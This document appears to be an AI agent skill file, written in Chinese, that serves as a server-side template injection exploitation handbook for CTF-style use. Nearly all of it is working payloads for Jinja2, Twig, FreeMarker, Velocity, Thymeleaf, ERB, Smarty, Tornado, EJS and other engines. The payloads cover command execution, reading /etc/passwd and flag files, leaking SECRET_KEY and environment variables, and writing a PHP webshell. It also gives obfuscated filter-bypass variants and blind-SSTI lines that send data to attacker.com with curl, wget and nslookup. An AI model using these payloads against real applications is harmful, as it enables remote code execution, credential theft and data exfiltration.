---
name: ssti-ssti-detail
description: Use when encountering ssti完整利用手册 - jinja2/twig/freemarker等模板引擎rce、沙箱绕过、盲ssti
---

# SSTI服务端模板注入

## Info

- **Domain**: web
- **Tags**: web, ssti, template

## 模板引擎识别
```
${7*7} = 49     → FreeMarker, Velocity, Thymeleaf
{{7*7}} = 49    → Jinja2, Twig, Tornado, Django, Nunjucks
{7*7} = 49      → Smarty
{{7*'7'}} = 7777777 → Jinja2
{{7*'7'}} = 49      → Twig
<%= 7*7 %>          → ERB (Ruby)
```

## Jinja2 (Python)

### 基础探测
```python
{{config}}
{{request}}
{{self}}
{{''.__class__}}
```

### 获取基类
```python
{{''.__class__.__mro__}}           # 获取继承链
{{''.__class__.__mro__[2]}}        # object基类
{{''.__class__.__bases__[0]}}      # 同上
```

### 获取子类
```python
{{''.__class__.__mro__[2].__subclasses__()}}  # 所有子类
{{''.__class__.__mro__[2].__subclasses__()[132]}}  # 第132个子类
```

### 常用子类索引
```python
# 查找可用类
for i, cls in enumerate(''.__class__.__mro__[2].__subclasses__()):
    if 'Popen' in str(cls) or 'file' in str(cls):
        print(i, cls)

# 常见索引 (因Python版本不同需确认)
# file: 40, 41 (Python2)
# Popen: 132, 230+ (需找subprocess.Popen)
# os._wrap_close: 132 (某些版本)
```

### 文件读取
```python
# 方法1: 通过file类 (Python2)
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# 方法2: 通过open函数
{{''['__class__']['__mro__'][2]['__subclasses__']()[40]('/etc/passwd')['read']()}}

# 方法3: 通过config对象
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# 方法4: 通过request对象
{{request.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# 方法5: 通过lipsum
{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
```

### 命令执行
```python
# 方法1: os.popen
{{lipsum.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# 方法2: subprocess.Popen
{{''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# 方法3: 通过__builtins__
{{''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
```

### 写文件
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET[c]);?>')}}
```

### 过滤绕过

#### 无引号
```python
{{request.args.a}}  # URL传参 ?a=__class__
{{lipsum.__globals__.os.popen(request.args.c).read()}}  # ?c=id

# 使用request对象
{{request|attr(request.args.a)|attr(request.args.b)}}  # ?a=__class__&b=__mro__
```

#### 无下划线
```python
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
{{''|attr('__cla'+'ss__')}}
{{''['__cla'+'ss__']}}
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

#### 无中括号
```python
{{''.__class__.__mro__.__getitem__(2)}}
{{''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(132)}}
```

#### 无点
```python
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)}}
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

#### 无数字
```python
{{lipsum|length}}  # 获取一个数字
{{()|length}}      # 0
{{(())|length}}    # 1

# 用字符串长度代替数字
{{''.__class__.__mro__.__getitem__('a'|length)}}  # 'a'|length = 1
```

#### 无括号 (只读)
```python
{%print(lipsum.__globals__.os.popen('id').read())%}
{%if lipsum.__globals__.os.popen('id').read()%}yes{%endif%}
```

### 关键字绕过
```python
# class
{{''['__cla'+'ss__']}}
{{''|attr('__cla'+'ss__')}}

# config被过滤
{{self.__init__.__globals__['config']}}

# 引号被过滤
{{request.args.a}}  # 通过URL参数传入
{{lipsum.__globals__[request.args.a]}}  # ?a=os

# 方括号被过滤
{{lipsum.__globals__.__getitem__('os')}}

# 下划线被过滤
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
```

### 常用对象链
```python
# config链
config.__class__.__init__.__globals__['os'].popen('id').read()

# request链
request.__class__.__mro__[2].__subclasses__()[40]('/flag').read()

# lipsum链
lipsum.__globals__['os'].popen('id').read()

# cycler链
cycler.__init__.__globals__.os.popen('id').read()

# joiner链
joiner.__init__.__globals__.os.popen('id').read()

# namespace链
namespace.__init__.__globals__.os.popen('id').read()
```

## 盲SSTI

### 时间盲注
```python
{{lipsum.__globals__.os.popen('sleep 3').read()}}
{%if lipsum.__globals__.os.popen('sleep 3').read()%}{%endif%}
```

### DNS外带
```python
{{lipsum.__globals__.os.popen('nslookup $(whoami).attacker.com').read()}}
{{lipsum.__globals__.os.popen('curl http://attacker.com/$(cat /flag)').read()}}
```

### HTTP外带
```python
{{lipsum.__globals__.os.popen('curl -d "$(cat /flag)" http://attacker.com/').read()}}
{{lipsum.__globals__.os.popen('wget --post-data="$(cat /flag)" http://attacker.com/').read()}}
```

## Twig (PHP)

### 探测
```php
{{7*7}}
{{_self}}
```

### 命令执行
```php
{{_self.env.registerUndefinedFilterCallback('exec')}}
{{_self.env.getFilter('id')}}

{{['id']|filter('system')}}

{{app.request.server.all|join(',')}}

# Symfony
{{app.request.query.all}}
```

## FreeMarker (Java)

### 探测
```
${7*7}
${1+1}
```

### 命令执行
```java
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${T(java.lang.Runtime).getRuntime().exec('id')}
```

### 文件读取
```java
${T(java.io.File).createNewFile('/tmp/test')}
${T(com.fasterxml.jackson.databind.ObjectMapper).readValue(...)}
```

## Velocity (Java)

### 探测
```
#set($x='')
${7*7}
```

### 命令执行
```java
#set($rt=$x.class.forName('java.lang.Runtime'))
$rt.getRuntime().exec('id')

#set($e=$x.class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript'))
$e.eval('java.lang.Runtime.getRuntime().exec("id")')

#set($s=$x.class.forName('java.util.Scanner'))
#set($p=$rt.getRuntime().exec('id').getInputStream())
$s.useDelimiter("\\A").next()
```

## Thymeleaf (Java)

### 探测
```
${7*7}
*{7*7}
```

### 命令执行
```java
${T(java.lang.Runtime).getRuntime().exec('id')}

# Spring Boot
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

## ERB (Ruby)

### 探测
```ruby
<%= 7*7 %>
```

### 命令执行
```ruby
<%= system('id') %>
<%= `id` %>
<%= File.read('/etc/passwd') %>
<%= IO.popen('id').read() %>
```

## Smarty (PHP)

### 探测
```
{$smarty.version}        # 返回版本信息
{7*7} = 49              # Smarty 模板标记
```

### 命令执行
```php
{php}phpinfo();{/php}            # PHP 代码执行（旧版本）
{php}system('id');{/php}

{if phpinfo()}{/if}
{if readfile('/flag')}{/if}
{if show_source('/flag')}{/if}
{if system('cat /flag')}{/if}
```

### {literal} 标签（PHP 5.x）
```php
{literal}<script language="php">xxx</script>;{/literal}
```
PHP 7 中 `{literal}` 中间内容会原样输出，不解析。

### CVE-2021-26120（Smarty < 3.1.39）
```php
{function name='rce(){};phpinfo();function '}{/function}
```

### CVE-2021-29454（Smarty < 3.1.42 / < 4.0.2）
```php
{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}
# system("whoami") - 八进制编码
```

## Mako (Python)

### 命令执行
```python
${self.module.runtime.globals['__builtins__']['__import__']('os').popen('id').read()}
```

## Tornado (Python)

### 模板语法
```python
{{ variable }}           # 变量输出
{% if condition %}...{% end %}    # 条件
{% for item in items %}...{% end %}  # 循环
{# comment #}            # 注释
{% extends "base.html" %}  # 继承
```

### 危险渲染
```python
# 危险：直接渲染用户输入
self.render_string(user_input)
self.render(user_input + ".html")
self.render("template.html", content=user_input)
```

### 命令执行
```python
# 直接导入模块
{{ __import__("os").popen("id").read() }}
{{ __import__("subprocess").check_output("ls", shell=True) }}

# 通过 handler 对象
{{ handler.settings }}
{{ handler.request.connection.stream.socket.getpeername() }}

# 对象链（类似Jinja2）
{{ "".__class__.__mro__[1].__subclasses__() }}
{{ "".__class__.__base__.__subclasses__() }}

# 使用open读取
{{ open("/etc/passwd").read() }}
{{ __import__("os").listdir("/") }}
```

### 绕过技巧
```python
# 字符串拼接
{{ [].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['__imp'+'ort__']('os') }}

# format构造
{{ "%c%c" % (111, 115) }}  # 构造"os"

# Base64/Hex编码
{{ __import__("base64").b64decode("b3M=") }}
{{ __import__("binascii").unhexlify("6f73") }}

# []访问替代
{{ __import__("os")["popen"]("id")["read"]() }}
{{ getattr(__import__("os"), "popen")("id").read() }}

# 属性链
{{ ().__class__.__bases__[0].__subclasses__()[40]("/etc/passwd").read() }}
```

### 检测
```python
{{ 7*7 }}        # 返回49 → 存在SSTI
{{ "abc" }}      # 输出abc
{{ handler.settings }}  # 暴露配置
{{ 1/0 }}        # 错误信息泄露
```

## Django (Python)

### 探测
```python
{{7*7}}
{{request}}
{{settings.SECRET_KEY}}
```

### 信息泄露
```python
{{ request }}
{{ request.user }}
{{ request.user.password }}
{{ settings.SECRET_KEY }}
```

## EJS (Node.js/Express)

### 检测
```javascript
<%= 7*7 %>     // 返回49 → 存在SSTI
<%= 1+1 %>     // 返回2
```

### 命令执行
```javascript
// 信息收集
<%= JSON.stringify(process.env) %>
<%= this %>
<%= process.env.FLAG %>

// 文件读取
<% const fs = require('fs') %>
<%= fs.readFileSync('/etc/passwd', 'utf8') %>
<%= require('fs').readFileSync('./app.js', 'utf8') %>

// 命令执行
<% const { execSync } = require('child_process') %>
<%= execSync('whoami').toString() %>
<%= global.process.mainModule.require('child_process').spawnSync('env').stdout.toString() %>
```

### 自定义分隔符绕过
```
// EJS 允许自定义 delimiter 选项
// 如果 ?delimiter=* 可控，则可用 <* *> 替代 <% %>
```

### outputFunctionName 污染
```
// 通过原型链污染 EJS 的 outputFunctionName
// 在渲染时执行注入的 Node.js 代码
```

## Pug/Jade (Node.js)

### 命令执行
```javascript
- var x = process.mainModule.require('child_process').execSync('id')
= x
```

## Make (Python)

模板标记符：`<%%>`

参考: https://xz.aliyun.com/news/11633

---

## Jinja2 高级绕过

### 斜体字符绕过 (eval 内)

```
# Unicode 数学斜体字符可绕过关键词检测
𝒶𝒷𝒸𝒹ℯ𝒻ℊ𝒽𝒾𝒿𝓀𝓁𝓂𝓃ℴ𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏𝒜ℬ𝒞𝒟ℰℱ𝒢ℋℐ𝒥𝒦ℒℳ𝒩𝒪𝒫𝒬ℛ𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵
𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡

# 替换 eval 内的关键词
_＿𝒾𝓂𝓅ℴ𝓇𝓉_＿('os').𝓅ℴ𝓅ℯ𝓃('whoami').𝓇ℯ𝒶𝒹()

# 完整 payload
{{url_for.__globals__['__builtins__']['eval']("_＿𝒾𝓂𝓅ℴ𝓇𝓉_＿('os').𝓅ℴ𝓅ℯ𝓃('whoami').𝓇ℯ𝒶𝒹()")}}
```

### 编码绕过（引号内字符串）

```python
# 八进制编码
{{''["\137\137\143\154\141\163\163\137\137"]["\137\137\155\162\157\137\137"][1]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[137]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]['\137\137\142\165\151\154\164\151\156\163\137\137']['\145\166\141\154']("\137\137\151\155\160\157\162\164\137\137\050\047\157\163\047\051\056\160\157\160\145\156\050\047\154\163\040\057\047\051\056\162\145\141\144\050\051")}}

# 十六进制编码
{{''["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x6d\x72\x6f\x5f\x5f"][1]["\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f"]()[137]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x20\x2f\x27\x29\x2e\x72\x65\x61\x64\x28\x29")}}

# Unicode 编码
{{''["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]["\u005f\u005f\u006d\u0072\u006f\u005f\u005f"][1]["\u005f\u005f\u0073\x75\..."]...}}
```

### 关键字绕过补充

```python
# [xxx] 被过滤 → 用 __getitem__(xx) 绕过
{{''.__class__.__mro__.__getitem__(2)}}

# 单引号被过滤 → 用 flask request 传参
{{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}
# ?a=__globals__&b=os&c=cat /flag

# __globals__ 被过滤 → attr 过滤
{{lipsum|attr("__globals__")}}

# {} 被过滤 → {%print()%} 替代 {{}}

# 获取符号的方法: 用内置函数转换为 list 后按下标取
lipsum|string|list  # 转化为 list 后指定下标取字符

# 字典创建 + join
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}

# _frozen_importlib.BuiltinImporter 存在时
# 调用 ["load_module"]("os")["popen"]("ls /").read()}}

# subprocess.Popen 存在时
# 调用 ('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
```

### Fenjing 自动化工具

```bash
# https://github.com/Marven11/Fenjing
# 本地起服务，替换 waf 即可自动绕过

# 用法: 指向被 SSTI 的 endpoint，Fenjing 会自动生成绕过 payload
```

### 文件名 SSTI（无回显场景）

```python
# 将 payload 写入文件，通过文件包含触发
def escape_string(s):
    replacements = {
        '{': r'\{', '}': r'\}', '[': r'\[', ']': r'\]',
        '(': r'\(', ')': r'\)', "'": r"\'", '"': r'\"',
    }
    for char, replacement in replacements.items():
        s = s.replace(char, replacement)
    return s

original = """{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('\\\\143'+'\\\\141'+'\\\\164'+'\\\\40'+'\\\\57'+'\\\\146'+'\\\\52').read()")}}"""
escaped = escape_string(original)
# 创建文件: vim \{\{x.__init__.__globals__...
```

---

## 盲 SSTI 补充

### DNS 外带（比赛环境不能出网，此法跳过）
### HTTP 外带（比赛环境不能出网，此法跳过）

### 时间盲注（本地可用）
```python
{{lipsum.__globals__.os.popen('sleep 3').read()}}
{%if lipsum.__globals__.os.popen('sleep 3').read()%}{%endif%}
```